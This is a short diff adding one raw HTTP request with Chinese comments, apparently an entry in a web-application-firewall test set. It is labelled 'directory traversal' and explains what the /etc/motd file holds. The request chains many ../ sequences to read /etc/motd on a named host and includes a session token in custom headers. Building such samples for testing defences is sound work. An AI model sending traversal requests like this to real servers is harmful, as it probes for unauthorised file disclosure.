@@ -1,0 +1,11 @@
+# 目录遍历_/etc/motd
+# /etc/motd文件通常包含系统管理员想要在用户登录时显示的信息，比如系统公告、提示、欢迎词等。
+# 
+# 当用户登录到Linux系统时，系统会自动读取/etc/motd文件的内容，并将其显示给用户。这样可以让管理员向用户传达重要信息或提示，例如系统维护通知、安全警告、最新更新等。
+GET /../../../../../../../../../../../etc/motd?acid=80050810&bid=hd_tag_m8mv24m0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24m0
+RM-PRO-Token: 60e856fe29144cc70288ac7dbc5ebc85
+RM-PRO-Time: 1742808391967
+User-Agent: curl/7.83.1
+
